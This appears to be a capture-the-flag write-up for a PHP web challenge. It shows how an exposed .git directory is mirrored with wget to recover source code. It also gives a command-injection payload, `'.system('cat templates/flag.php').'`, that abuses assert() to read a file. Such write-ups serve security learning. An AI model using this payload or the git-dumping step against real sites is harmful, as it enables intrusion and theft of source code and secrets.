# mfw

![Screenshot from 2021-07-25 09-33-39](https://user-images.githubusercontent.com/87865134/126885810-05db8c07-e99c-420d-bf93-558c6a589a71.png)

## - Hint:
  - web use: *git*, *php*, *bootstrap* -> maybe git disclosure
  - *?page=flag* -> flag may be in here

![Screenshot from 2021-07-25 09-33-50](https://user-images.githubusercontent.com/87865134/126885853-3bce7c1f-9960-4806-8559-5d9fe039d969.png)

![Screenshot from 2021-07-25 09-34-14](https://user-images.githubusercontent.com/87865134/126885855-cc5362ce-14f4-4f1b-8585-18436eb77820.png)

## 1. Check git disclosure
  - `http://111.200.241.244:64683/.git/`  -> Git Disclosure   <vr/>
  ![Screenshot from 2021-07-25 09-41-39](https://user-images.githubusercontent.com/87865134/126885895-1f46e63d-2207-4ad7-9330-28bab05b7850.png)

## 2. Download git snapshot to view source code
  - download: `wget -r http://111.200.241.244:64683/.git/` 
  - after download, check git status:  
    `git status`  
    ![Screenshot from 2021-07-25 09-47-07](https://user-images.githubusercontent.com/87865134/126885993-5e0c3d6b-0e58-411c-9aae-a27c09312884.png)

  - some files are deleted -> restore file:  
     ```
     git restore index.php
     git restore templates
     ```
## 3. View source code
  - **in file flag.php:**  
   ![Screenshot from 2021-07-25 09-49-12](https://user-images.githubusercontent.com/87865134/126886044-9b28b33e-351e-4ce8-b0ac-dcfb33e67784.png)  
    - > Flag maybe here
  
  - **in file index.php:**  
  ![Screenshot from 2021-07-25 09-49-22](https://user-images.githubusercontent.com/87865134/126886041-aa6138af-6cb7-458a-bcd3-153b2c754436.png)  
    - `assert(mixed $assertion, string $description = ?): bool`
      - > -> Command injection

## 4. Command Injection
  - payload: `'.system('cat templates/flag.php').'`  
  ![Screenshot from 2021-07-25 09-57-12](https://user-images.githubusercontent.com/87865134/126886172-af5e8afc-3fe3-4754-b7bf-d8d1fba82e3b.png)

   
## - Decription:
  - > category: 
    - Git disclosure
    - Command Injection

## - Reference:
  - [assert()](https://www.php.net/manual/en/function.assert.php)
